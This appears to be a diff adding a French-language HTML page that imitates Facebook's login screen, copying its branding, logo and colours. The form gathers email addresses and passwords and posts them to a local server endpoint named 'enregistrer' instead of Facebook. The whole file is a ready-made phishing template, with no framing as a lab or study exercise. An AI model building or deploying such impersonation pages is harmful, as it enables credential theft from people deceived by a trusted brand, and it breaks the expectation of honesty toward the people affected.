@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Page de Connexion</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 360px;
+            text-align: center;
+        }
+        .container .header {
+            font-size: 32px;
+            font-weight: bold;
+            color: #1877f2;
+        }
+        .container h2 {
+            font-size: 20px;
+            color: #000;
+            margin: 10px 0 20px 0;
+        }
+        .container form {
+            display: flex;
+            flex-direction: column;
+        }
+        .container input {
+            margin: 10px 0;
+            padding: 10px;
+            border: 1px solid #dddfe2;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .container .facebook-button {
+            background-color: #1877f2;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container .facebook-button img {
+            margin-right: 10px;
+        }
+        .container .facebook-button:hover {
+            background-color: #166fe5;
+        }
+        .container .links {
+            margin-top: 10px;
+        }
+        .container .create-account-button {
+            background-color: #42b72a;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .container .create-account-button:hover {
+            background-color: #36a420;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">Facebook</div>
+        <h2>Se connecter à Facebook</h2>
+        <form action="http://localhost:3000/enregistrer" method="POST">
+            <input type="email" name="email" placeholder="Adresse e-mail" required>
+            <input type="password" name="password" placeholder="Mot de passe" required>
+            <button type="submit" class="facebook-button">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook logo" width="20" height="20">
+                Se connecter avec Facebook
+            </button>
+        </form>
+        <div class="links">
+            <a href="#">Mot de passe oublié?</a> | 
+            <a href="#">Créer un compte</a>
+        </div>
+        <button class="create-account-button">Créer un nouveau compte</button>
+    </div>
+</body>
+</html>
